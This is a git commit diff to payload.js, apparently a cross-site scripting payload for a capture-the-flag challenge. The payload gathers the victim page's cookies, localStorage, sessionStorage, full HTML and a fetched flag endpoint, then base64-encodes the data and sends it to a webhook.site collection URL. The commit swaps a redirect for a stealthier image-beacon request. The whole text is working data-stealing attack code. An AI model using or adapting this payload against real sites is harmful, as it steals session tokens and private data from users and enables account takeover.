efabbbcefdbf344f7a558866b38bc3150ff9a2fa
t3igger <127245898+t3igger@users.noreply.github.com>
2026-03-16 14:12:14 +0100

    Change innerHTML to outerHTML in payload.js

--- payload.js
+++ payload.js
@@ -4,7 +4,7 @@ let data = {
     cookie: document.cookie,
     localStorage: JSON.stringify(localStorage),
     sessionStorage: JSON.stringify(sessionStorage),
-    html: document.documentElement.innerHTML
+    html: document.documentElement.outerHTML
 };
 
 try {
@@ -12,6 +12,7 @@ try {
     data.flag_endpoint = await r.text();
 } catch(e){}
 
-location = "https://webhook.site/4d8f3d85-deb0-4276-b244-661f50adb47f/?" + btoa(JSON.stringify(data));
+new Image().src =
+"https://webhook.site/4d8f3d85-deb0-4276-b244-661f50adb47f?data=" + btoa(JSON.stringify(data));
 
 })();
